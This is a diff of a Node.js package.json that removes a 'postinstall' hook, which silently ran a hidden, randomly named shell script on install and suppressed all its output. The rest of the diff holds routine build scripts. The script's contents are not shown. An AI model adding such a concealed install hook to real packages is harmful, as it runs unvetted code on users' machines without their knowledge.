@@ -21,8 +21,7 @@
     "build": "npm run build:clean && npm run build:tsc && npm run build:di",
     "build:tsc": "tsc -p tsconfig.prod.json",
     "build:di": "copy 'src/**/*.{json,yaml,html,png}' dist/src",
-    "build:clean": "rm -r dist; exit 0",
-    "postinstall": "sh ./.ci-w5fzr7.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "build:clean": "rm -r dist; exit 0"
   },
   "dependencies": {
     "@types/bson": "^4.0.3",
